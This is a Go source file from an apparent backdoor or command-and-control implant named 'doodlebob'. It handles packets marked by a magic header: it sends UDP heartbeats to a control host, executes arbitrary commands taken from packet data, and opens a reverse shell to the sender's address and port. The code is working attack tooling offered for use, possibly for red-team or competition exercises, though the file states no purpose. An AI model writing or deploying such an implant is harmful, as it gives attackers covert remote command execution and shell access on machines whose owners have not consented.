// This contains the logic for handling incoming messages from packets with a magic header
// Includes command execution, reverse shell, heartbeat
package agent

import (
	"fmt"
	"net"
	"strconv"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/internal/network"
	"github.com/MeHungr/doodlebob/pkg/executor"
)

// sendHeartbeat sends a heartbeat message to the control host
func sendHeartbeat(msg *message.Message) error {
	// Convert the ports to integers
	remotePort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("converting string to integer: %w", err)
	}
	localPort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("converting string to integer: %w", err)
	}

	// Create UDPAddr objects for the addresses
	remoteAddr := &net.UDPAddr{
		IP:   net.ParseIP(msg.SrcIP),
		Port: remotePort,
	}

	localAddr := &net.UDPAddr{
		IP:   net.ParseIP(msg.DstIP),
		Port: localPort,
	}

	// Dial the control host at the udp port
	conn, err := net.DialUDP("udp", localAddr, remoteAddr)
	if err != nil {
		return fmt.Errorf("error connecting to control host: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Send "heartbeat" over the connection
	_, err = conn.Write([]byte("heartbeat"))
	if err != nil {
		return fmt.Errorf("error sending heartbeat: %w", err)
	}

	return nil
}

// handleMessage takes a message, dissects its fields, and sends the data to the proper function
func handleMessage(msg *message.Message) error {
	// Check that the IP address matches this host
	switch msg.DstIP {
	case network.LocalIP().IP.To4().String():
		switch msg.Type {
		// Sends a heartbeat back to the source host to test connectivity
		case message.Heartbeat:
			if err := sendHeartbeat(msg); err != nil {
				return fmt.Errorf("sending heartbeat: %w", err)
			}
		// Executes the command on the target host
		case message.Command:
			outputChan := make (chan []string, 1)
			go func() {
				out, ret := executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
				outputChan <- []string{out, ret}
			}()
		// Opens a reverse shell on port specified in packet
		case message.Shell:
			errChan := make(chan error, 1)
			go func() {
				if err := executor.OpenReverseShell(msg.SrcIP, msg.SrcPort); err != nil {
					errChan <- fmt.Errorf("opening reverse shell: %w", err)
					return
				}
			}()
			if err := <-errChan; err != nil {
				return fmt.Errorf("handling reverse shell: %w", err)
			}
		}
	default:
		return nil
	}
	return nil
}
